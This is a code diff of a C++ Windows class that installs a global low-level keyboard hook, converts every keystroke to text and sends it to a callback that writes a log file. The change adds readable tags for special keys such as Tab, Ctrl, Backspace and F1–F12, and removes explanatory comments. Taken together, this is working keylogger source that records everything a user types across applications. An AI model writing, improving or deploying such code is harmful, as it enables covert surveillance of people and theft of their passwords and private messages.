@@ -3,9 +3,9 @@
 
 using namespace std;
 
-std::function<void(wchar_t[])> Hook::callback;
+std::function<void(const wchar_t[])> Hook::callback;
 
-void Hook::setHook(std::function<void(wchar_t[])> keyboardCallback) {
+void Hook::setHook(std::function<void(const wchar_t[])> keyboardCallback) {
 	callback = keyboardCallback;
 	std::cout << "set hook";
 	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, NULL, 0);
@@ -20,50 +20,82 @@ LRESULT CALLBACK Hook::hookProc(const int nCode, const WPARAM wParam, const LPAR
 	BYTE keyState[256] = { 0 };
 	bool keyStateResult;
 	wchar_t buffer[5];
-
-	/*
-	* See here for why this seemingly useless call is required:
-	* http://www.siao2.com/2006/12/20/1332470.aspx
-	*/
+	
 	GetKeyState(NULL);
-
-	/*
-	* GetKeyboardState: https://msdn.microsoft.com/en-us/library/windows/desktop/ms646299(v=vs.85).aspx
-	*/
 	keyStateResult = GetKeyboardState(keyState);
 
 	switch (wParam) {
 	case WM_KEYDOWN: {
-		/*
-		*  Converts the virtual key code and keystate to unicode character.
-		*  Virtual Key Codes: https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
-		*  toUnicodeEx: https://msdn.microsoft.com/en-us/library/windows/desktop/ms646320(v=vs.85).aspx
-		*/
-		int toUnicodeResult = ToUnicodeEx(
-			p->vkCode,
-			p->scanCode,
-			keyState,
-			buffer,
-			_countof(buffer),
-			0,
-			NULL
-		);
+		std::wstring result;
+		switch (p->vkCode) {
+		case VK_RETURN:
+			result = L"\n";
+			break;
+		case VK_TAB:
+			result = L"<TAB>";
+			break;
+		case VK_LCONTROL:
+			result = L"<CTRL>";
+			break;
+		case VK_RCONTROL:
+			result = L"<RCTRL>";
+			break;
+		case VK_LWIN:
+			result = L"<WIN>";
+			break;
+		case VK_BACK:
+			result = L"<BS>";
+			break;
+		case VK_DELETE:
+			result = L"<DEL>";
+			break;
+		case VK_ESCAPE:
+			result = L"<ESC>";
+			break;
+		case VK_F1:
+			result = L"<F1>";
+			break;
+		case VK_F2:
+			result = L"<F2>";
+			break;
+		case VK_F3:
+			result = L"<F3>";
+			break;
+		case VK_F4:
+			result = L"<F4>";
+			break;
+		case VK_F5:
+			result = L"<F5>";
+			break;
+		case VK_F6:
+			result = L"<F6>";
+			break;
+		case VK_F7:
+			result = L"<F7>";
+			break;
+		case VK_F8:
+			result = L"<F8>";
+			break;
+		case VK_F9:
+			result = L"<F9>";
+			break;
+		case VK_F10:
+			result = L"<F10>";
+			break;
+		case VK_F11:
+			result = L"<F11>";
+			break;
+		case VK_F12:
 
-		if (p->vkCode == VK_RETURN) {
-			/*
-			* Was the enter key pressed? If so, insert a new line character
-			* into the log file.
-			*/
-			callback(L"\n");
-		} else {
-			/*fggddfds
-			* Log everything else to file. It's important to note that certain keys
-			* will produce odd characters (such as backspace). We could handle these
-			* but in this instance it's not required.
-			*/
-			callback(buffer);
+			result = L"<F12>";
+			break;
+		default:
+			int toUnicodeResult = ToUnicodeEx(p->vkCode, p->scanCode, keyState,
+				buffer, _countof(buffer), 0, nullptr);
+			result = buffer;
 		}
-		break;
+
+		callback(result.c_str());
 	}
 	}
 	
